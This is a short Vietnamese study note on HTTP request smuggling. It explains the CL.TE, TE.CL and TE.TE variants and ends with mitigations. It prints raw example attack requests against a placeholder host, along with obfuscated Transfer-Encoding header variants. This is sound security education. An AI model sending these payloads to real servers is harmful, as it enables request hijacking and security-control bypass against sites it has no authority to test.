# 🔀 HTTP Request Smuggling

## 1. 📌 Tổng quan
HTTP Request Smuggling là kỹ thuật tấn công can thiệp vào chuỗi xử lý HTTP request giữa Front-end Server (Reverse Proxy, Load Balancer) và Back-end Server do sự không đồng nhất trong việc phân tích kích thước của HTTP request (`Content-Length` và `Transfer-Encoding`).

---

## 2. 💣 Phân loại cơ bản

### 1. CL.TE (Front-end dùng Content-Length, Back-end dùng Transfer-Encoding):
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### 2. TE.CL (Front-end dùng Transfer-Encoding, Back-end dùng Content-Length):
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### 3. TE.TE (Cả 2 đều hỗ trợ TE nhưng một bên bị đánh lừa qua Obfuscation):
- Các biến thể TE header:
  ```http
  Transfer-Encoding: xchunked
  Transfer-Encoding : chunked
  Transfer-Encoding: chunked
  Transfer-Encoding: x
  ```

---

## 3. 🛡️ Biện pháp phòng chống (Mitigation)
1. Sử dụng chuẩn HTTP/2 từ Front-end tới Back-end và tắt HTTP downgrade.
2. Đồng bộ cấu hình giữa Front-end và Back-end web server.
3. Từ chối ngay các request có cả 2 header `Content-Length` và `Transfer-Encoding`.
